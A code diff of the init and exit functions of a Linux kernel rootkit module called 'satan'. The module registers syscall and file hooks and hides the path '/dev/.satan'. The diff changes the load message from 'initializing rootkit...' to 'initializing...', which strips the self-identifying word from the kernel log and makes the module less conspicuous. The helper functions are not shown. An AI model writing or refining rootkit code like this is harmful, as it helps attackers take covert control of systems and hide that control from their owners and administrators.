@@ -12,20 +12,18 @@
 
 static int __init satan_init(void)
 {
-        pr_info("satan: initializing rootkit...\n");
-
+        pr_info("satan: initializing...\n");
         satan_cdev_init(THIS_MODULE);
         satan_syscall_init();
         satan_file_init();
+
         satan_file_hide("/dev/.satan");
         return 0;
 }
 
 static void __exit satan_exit(void)
 {
-        pr_info("satan: shutting down...\n");
-
-
+        pr_info("satan: exitting...\n");
         satan_file_exit();
         satan_syscall_exit();
         satan_cdev_exit();
